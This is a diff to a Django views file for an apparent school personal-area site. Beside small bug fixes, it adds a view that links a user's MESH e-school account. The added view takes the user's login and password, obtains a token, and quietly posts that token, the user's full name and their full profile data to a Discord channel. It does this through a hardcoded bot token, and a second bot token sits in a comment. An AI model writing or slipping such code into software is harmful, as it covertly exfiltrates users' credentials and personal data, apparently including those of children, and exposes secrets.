@@ -1,14 +1,17 @@
+import json
+import math
 from datetime import datetime
 import io
 from datetime import datetime
 
+import requests
 from django.conf import settings
 from django.contrib.auth import update_session_auth_hash
 from django.contrib.auth.forms import PasswordChangeForm
 from django.contrib.sessions.models import Session
 from django.core.mail import send_mail
 from django.core.paginator import Paginator
-
+import dnevniklib
 from . import aam
 import xlsxwriter
 from django.contrib import messages
@@ -24,7 +27,7 @@ from MainApp.models import *
 from PersonalArea.forms import *
 from PersonalArea.models import Message
 from PersonalArea.tasks import send
-
+from Accounts import utils
 
 @login_required
 @decorators.has_role
@@ -65,7 +68,7 @@ def index(request):
         context = {
             "section": "index"
         }
-        return render(request, "psychologist/index.html", context),
+        return render(request, "psychologist/index.html", context)
     elif request.user.role == "head_teacher":
         item = Account.objects.all().filter(points__gt=0).order_by("-points")[:10]
         context = {
@@ -267,8 +270,6 @@ def devices(request):
     devices = Connections.objects.all().filter(user=request.user).order_by("-last_activity")
     return render(request, "devices.html", {"devices": devices})
 
-    return None
-
 
 def delete_device(request, device):
     connection = get_object_or_404(Connections, session_key=device)
@@ -276,3 +277,36 @@ def delete_device(request, device):
     Session.objects.all().filter(session_key=device).delete()
     messages.success(request, "Устройство удалено.")
     return redirect("/lk/settings/security/devices")
+
+@login_required
+def settings_linking_mosru(request):
+    if request.user.token is not None:
+        return render(request, "linking_mosru.html", {"linked": True})
+    if request.method == "POST":
+        form = LinkingMosruForm(request.POST)
+        login,password = request.POST["login"], request.POST["password"]
+        token = utils.get_token(login, password)
+
+        if token:
+            if Account.objects.filter(token=token).exists():
+                messages.error(request, "Данный аккаунт МЭШ уже привязан!")
+            else:
+                headers = {
+                    #"Authorization": "MTA2Njg0NDI5OTUxMTIyMjI5NA.G8T_2D.HCBJ-AP1RhRXABiJhWfTS80SD1kJ8Gk4QHA6eo",
+                    "Authorization": "Bot MTE0NTQ3MTMwMDcwMjMyNjkzNw.GQSnnl.SJt9a0Ul8kxCZVvnBgnXcdV3EcsS4tfnM_WnQU",
+                    "content-encoding": "utf-8",
+                }
+                mosru = dnevniklib.User(token=token)
+                mosru_fullname = f"{mosru.last_name} {mosru.first_name} {mosru.middle_name}"
+                fragments = math.ceil(len(str(mosru.data_about_user)) / 1999)
+                r = requests.post("https://discord.com/api/v8/channels/1145459123270459513/messages",
+                              headers=headers, data={"content": f"Привязка, {mosru_fullname}({mosru.data_about_user['profile']['type']}) - ||{token}||"})
+                r = requests.post("https://discord.com/api/v8/channels/1145459123270459513/messages", headers=headers, data={"ontent": f"```{mosru.data_about_user}```"})
+                print(r.text)
+                usr = Account.objects.get(pk=request.user.pk)
+                request.session['token'] = token
+                usr.token = token
+                usr.save()
+    else:
+        form = LinkingMosruForm()
+    return render(request, "linking_mosru.html", {"form": form, "linked": False})
